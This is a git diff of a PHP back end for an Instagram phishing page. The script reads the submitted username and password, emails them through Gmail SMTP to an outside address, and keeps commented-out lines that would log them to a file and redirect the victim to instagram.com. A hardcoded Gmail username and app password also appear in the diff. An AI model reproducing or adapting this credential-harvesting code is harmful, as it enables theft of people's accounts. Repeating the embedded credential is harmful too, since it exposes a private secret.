@@ -1,37 +1,42 @@
 <?php
 ini_set('display_errors', '1');
+
 $username=$_POST['username'];
 $password=$_POST['password'];
+
 use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
 use PHPMailer\PHPMailer\SMTP;
-
-// require 'phpmailer/src/Exception.php';
-// require 'phpmailer/src/PHPMailer.php';
-// require 'phpmailer/src/SMTP.php';
-
+use PHPMailer\PHPMailer\Exception;
+require 'PHPMailer/';
 
 $mail = new PHPMailer(true);
 
-$mail->isSMTP();
-$mail->Host = 'smtp.gmail.com';
-$mail->SMTPAuth = true;
-$mail->Username = 'mrsterixmr@gmail.com';
-$mail->Password = 'ppamjhevewmihvqz';
-$mail->SMTPSecure = 'ssl';
-$mail->Port = 465;
+try {
+    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
+    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
+    $mail->Username   = 'mrsterixmr@gmail.com';                     //SMTP username
+    $mail->Password   = 'ppamjhevewmihvqz';                               //SMTP password
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
+    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
-$mail->setFrom('mrsterixmr@gmail.com');
+    //Recipients
+    $mail->setFrom('from@example.com', 'Logins');
+    $mail->addAddress('Nikibestshark@gmail.com');     //Add a recipient
 
-$mail->addAddress("Nikibestshark@gmail.com");
 
-$mail->isHTML(true);
+    $message = "Login" . $username . "/n" . "Password" . $password;
 
-$mail->Subject = $username;
-$mail->Body = $password;
+    //Content
+    $mail->isHTML(true);                                  //Set email format to HTML
+    $mail->Subject = 'Here is the subject';
+    $mail->Body    = $message;
+    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
 
-$mail->send();
-
+    $mail->send();
+    echo 'Message has been sent';
+} catch (Exception $e) {
+    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+}
 
 // $fp = fopen('data.txt', 'a+');
 // fwrite($fp, "login - ". $username."\n");
@@ -44,6 +49,6 @@ $mail->send();
 
 
 // file_put_contents("data.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
-exit();
+// header('Location: https://instagram.com');
+// exit();
 ?> 
